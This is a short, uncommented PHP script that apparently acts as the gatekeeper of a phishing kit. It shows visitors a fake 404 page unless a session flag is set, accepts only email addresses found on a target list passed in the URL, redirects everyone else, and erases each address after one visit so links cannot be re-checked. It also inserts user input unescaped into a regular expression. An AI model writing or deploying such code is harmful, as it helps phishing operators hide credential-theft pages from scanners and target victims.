<?php
error_reporting(0);
session_start();

if (!isset($_SESSION['redi_watch'])) {
header("HTTP/1.0 404 Not Found");
exit("<h1>Not Found</h1>
The requested URL " . $_SERVER["REQUEST_URI"] . " was not found on this server.
<hr>");
}

$getemail = $_GET['data'];
$mylist= file_get_contents($email_list);

if (!isset($_GET['data']) || empty($_GET['data'])){
    	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
}

if (filter_var($getemail, FILTER_VALIDATE_EMAIL) == false) {
    	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
    }
    
if (!preg_match( "#\b{$getemail}\b#", $mylist ) ) {
    	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
}
    


$e_content = file_get_contents($email_list);
$e_content = str_replace($getemail, '', $e_content);
file_put_contents($email_list, $e_content);

?>